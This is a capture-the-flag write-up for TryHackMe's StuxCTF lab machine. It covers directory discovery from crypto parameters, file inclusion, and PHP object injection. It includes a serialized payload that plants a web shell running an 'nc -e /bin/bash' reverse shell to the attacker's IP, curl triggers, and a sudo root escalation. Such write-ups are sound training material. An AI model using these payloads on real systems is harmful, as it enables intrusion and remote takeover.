---
clayout: ctf
title: StuxCTF
type: TryHackMe
date: 2025-10-07
level: Medium
icon: /ctf/tryhackme/stux-ctf/icon-room.png
image: /ctf/tryhackme/stux-ctf/icon-room.png
description: Crypto, serealization, priv scalation and more ...!
ctf-link: https://tryhackme.com/room/stuxctf
---

## Machine Overview

StuxCTF is a medium-difficulty CTF challenge on TryHackMe. It covers topics such as cryptography, serialization, privilege escalation, and more. The challenge is designed to test your skills in these areas and provide a comprehensive overview of these concepts.

## Enumeration

### Nmap Scan

```bash
nmap -sC -sV -p- -oN nmap.txt 10.10.0.107
```

**Scan results:**

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu)
```

### Web Enumeration

Navigating to `http://10.10.0.107/` reveals a simple page with the following text:

```html
is blank....
```

Inside the source code, we can see the following comment:

```html
<!-- The secret directory is...
    p: 9975298661930085086019708402870402191114171745913160469454315876556947370642799226714405016920875594030192024506376929926694545081888689821796050434591251;
    g: 7;
    a: 330;
    b: 450;
    g^c: 6091917800833598741530924081762225477418277010142022622731688158297759621329407070985497917078988781448889947074350694220209769840915705739528359582454617;
-->
```

This looks like Elgamal encryption parameters.

### Secret Directory Discovery

The challenge provides a hint about finding the hidden directory:

> [!NOTE] Hint
> `g ^ a mod p, g ^ b mod p, g ^ C mod p`  
> **Task**: Find the first 128 characters of the secret

This is referencing **Elgamal encryption** parameters found in the HTML comments. In Elgamal, the shared secret can be calculated using:

**Mathematical Background:**

- `g^a mod p` and `g^b mod p` are public keys
- `g^c mod p` is the encrypted message
- The shared secret is: `(g^c)^(a*b) mod p = g^(c*a*b) mod p`

**Python Implementation:**

```python
# Elgamal parameters from HTML comments
p = 9975298661930085086019708402870402191114171745913160469454315876556947370642799226714405016920875594030192024506376929926694545081888689821796050434591251
g = 7
a = 330
b = 450
g_c = 6091917800833598741530924081762225477418277010142022622731688158297759621329407070985497917078988781448889947074350694220209769840915705739528359582454617

# Calculate the shared secret
secret = pow(g_c, a * b, p)
print(str(secret)[:128])
```

**Output:**

```text
47315028937264895539131328176684350732577039984023005189203993885687328953804202704977050807800832928198526567069446044422855055
```

Navigating to `http://10.10.0.107/47315028937264895539131328176684350732577039984023005189203993885687328953804202704977050807800832928198526567069446044422855055/` reveals the following page:

![Secret Directory](/ctf/tryhackme/stux-ctf/secret-directory.png)

### File Inclusion Vulnerability

Looking at the page source, we find a hint in the HTML comments:

```html
<!-- hint: /?file= -->
```

This suggests a **Local File Inclusion (LFI)** vulnerability. Testing with `/?file=index.php` reveals the application's source code:

![Index PHP dump](/ctf/tryhackme/stux-ctf/index-php-dump.png)

The response is encoded using multiple transformations. Using [CyberChef](https://cyberchef.net/), we decode it using the following pipeline: **Hex → Bytes → Reverse → Base64 → UTF-8**

![CyberChef](/ctf/tryhackme/stux-ctf/cyberchef.png)

**Decoded PHP Source Code:**

```php
error_reporting(0);
class file {
    public $file = "dump.txt";
    public $data = "dump test";
    function __destruct() {
        file_put_contents($this->file, $this->data);
    }
}

$file_name = $_GET['file'];
if (isset($file_name) && !file_exists($file_name)) {
    echo "File no Exist!";
}

if ($file_name=="index.php") {
    $content = file_get_contents($file_name);
    $tags = array("", "");
    echo bin2hex(strrev(base64_encode(nl2br(str_replace($tags, "", $content)))));
}
unserialize(file_get_contents($file_name));
<!-- ... more code ... -->
```

### Serialization Attack Analysis

The vulnerability lies in the `unserialize(file_get_contents($file_name))` line. This creates a **PHP Object Injection** vulnerability because:

1. **Unsafe Deserialization**: The application deserializes any file content without validation
2. **Dangerous Magic Method**: The `file` class has a `__destruct()` method that writes data to files
3. **Remote File Inclusion**: We can include remote files via HTTP

**Attack Vector**: Create a malicious serialized object that writes a PHP reverse shell to the server.

### Exploitation Steps

#### Step 1: Create Malicious Serialized Object

```php
<?php
class file {
    public $file = "reverse-shell.php";
    public $data = "<?php shell_exec('nc -e /bin/bash 10.14.102.54 4444'); ?>";
}
echo serialize(new file());
?>
```

#### Step 2: Host the Payload

```bash
# Save the serialized object to reverse-shell.txt
# Start HTTP server to serve the payload
python3 -m http.server 8080
```

#### Step 3: Trigger Remote File Inclusion

```bash
# Include the remote serialized object
curl "http://10.10.65.171/47315028937264895539131328176684350732577039984023005189203993885687328953804202704977050807800832928198526567069446044422855055/?file=http://10.14.102.54:8080/reverse-shell.txt"
```

#### Step 4: Set Up Listener

```bash
# Listen for reverse shell connection
nc -lnvp 4444
```

#### Step 5: Execute the Web Shell

```bash
# Trigger the uploaded reverse-shell.php
curl "http://10.10.65.171/47315028937264895539131328176684350732577039984023005189203993885687328953804202704977050807800832928198526567069446044422855055/reverse-shell.php"
```

**Shell received as www-data:**

```bash
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> [!TIP] Upgrade to a proper TTY
>
> ```bash
> export TERM=xterm
> python -c 'import pty; pty.spawn("/bin/bash")'
> ```

> [!IMPORTANT] User flag
> `/home/grecia/user.txt`

## Privilege Escalation

### Initial Access Verification

After gaining shell access as `www-data`, we verify our current privileges:

```bash
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Sudo Privilege Analysis

Checking sudo permissions reveals a critical misconfiguration:

```bash
sudo -l
```

**Output:**

```bash
User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: ALL
```

### Root Access

The `www-data` user has been granted **unrestricted sudo access** without password requirements. This is an extremely dangerous misconfiguration that allows immediate privilege escalation:

```bash
# Escalate to root
sudo su -

# Verify root access
id
uid=0(root) gid=0(root) groups=0(root)
```

> [!WARNING] Security Misconfiguration
> This type of sudo misconfiguration (`NOPASSWD: ALL`) is a critical security vulnerability that should never exist in production environments.

> [!IMPORTANT] Root Flag
> `/root/root.txt`
